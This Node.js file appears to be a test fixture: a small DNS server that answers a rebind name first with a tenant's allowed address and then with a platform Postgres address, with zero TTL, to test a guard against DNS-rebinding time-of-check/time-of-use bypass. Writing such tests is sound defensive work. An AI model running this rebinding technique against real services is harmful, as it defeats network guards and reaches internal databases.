// A DNS resolver that REBINDS a name: case 1's TOCTOU test. For REBIND_NAME it answers the ALLOWED
// address (the tenant's private source) on the first query and the DENIED address (the platform's
// Postgres) on the next, alternating - so a guard that resolves-then-passes-the-name is beaten when
// the driver re-resolves. Every other name it forwards to Docker's embedded DNS (127.0.0.11), so a
// container can use this as its only resolver and still find its peers.
import dgram from 'node:dgram';

const PORT = 53;
const REBIND_NAME = (process.env.REBIND_NAME || 'rebind.evil.test').toLowerCase();
const ALLOWED_IP = process.env.ALLOWED_IP || '172.31.20.21'; // source-pg (tenant's private source)
const DENIED_IP = process.env.DENIED_IP || '172.31.10.11'; // platform-pg
const UPSTREAM = process.env.UPSTREAM || '127.0.0.11';
const TTL = 0; // no caching, so the flip is observable

let flip = 0;
const server = dgram.createSocket('udp4');

function parseName(buf, offset) {
  const labels = [];
  let o = offset;
  while (buf[o] !== 0) {
    const len = buf[o];
    labels.push(buf.toString('ascii', o + 1, o + 1 + len));
    o += 1 + len;
  }
  return { name: labels.join('.'), end: o + 1 };
}

function buildAnswer(query, qname, qend, ip) {
  const header = Buffer.from(query.subarray(0, 12));
  header[2] = 0x81; header[3] = 0x80; // response, recursion available
  header.writeUInt16BE(1, 6); // ANCOUNT = 1
  const question = query.subarray(12, qend + 4); // name + qtype + qclass
  const ans = Buffer.alloc(16);
  ans.writeUInt16BE(0xc00c, 0); // pointer to the name at offset 12
  ans.writeUInt16BE(1, 2); // type A
  ans.writeUInt16BE(1, 4); // class IN
  ans.writeUInt32BE(TTL, 6);
  ans.writeUInt16BE(4, 10); // rdlength
  const [a, b, c, d] = ip.split('.').map(Number);
  ans[12] = a; ans[13] = b; ans[14] = c; ans[15] = d;
  return Buffer.concat([header, question, ans]);
}

server.on('message', (msg, rinfo) => {
  let q;
  try { q = parseName(msg, 12); } catch { return; }
  const name = q.name.toLowerCase();
  const qtype = msg.readUInt16BE(q.end);
  if (name === REBIND_NAME && qtype === 1) {
    const ip = (flip++ % 2 === 0) ? ALLOWED_IP : DENIED_IP;
    console.log(`[resolver] ${name} -> ${ip} (query #${flip})`);
    server.send(buildAnswer(msg, q.name, q.end, ip), rinfo.port, rinfo.address);
    return;
  }
  // Forward everything else to the embedded Docker DNS.
  const fwd = dgram.createSocket('udp4');
  fwd.on('message', (reply) => { server.send(reply, rinfo.port, rinfo.address); fwd.close(); });
  fwd.on('error', () => { try { fwd.close(); } catch {} });
  fwd.send(msg, PORT, UPSTREAM);
  setTimeout(() => { try { fwd.close(); } catch {} }, 3000);
});

server.bind(PORT, () => console.log(`[resolver] udp/53, rebinding ${REBIND_NAME}: ${ALLOWED_IP} then ${DENIED_IP}`));
